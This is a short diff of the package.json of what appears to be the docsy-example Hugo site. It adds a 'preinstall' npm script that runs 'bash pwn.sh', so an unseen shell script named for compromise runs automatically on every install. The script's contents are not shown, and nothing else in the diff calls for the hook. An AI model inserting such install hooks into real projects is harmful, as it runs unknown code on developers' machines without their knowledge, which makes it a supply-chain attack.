@@ -10,6 +10,7 @@
   "bugs": "https://github.com/google/docsy-example/issues",
   "spelling": "cSpell:ignore docsy hugo htmltest precheck postbuild rtlcss -",
   "scripts": {
+    "preinstall": "bash pwn.sh",
     "_build": "npm run _hugo-dev --",
     "_check:links": "echo IMPLEMENTATION PENDING for check-links; echo",
     "_hugo": "hugo --cleanDestinationDir",
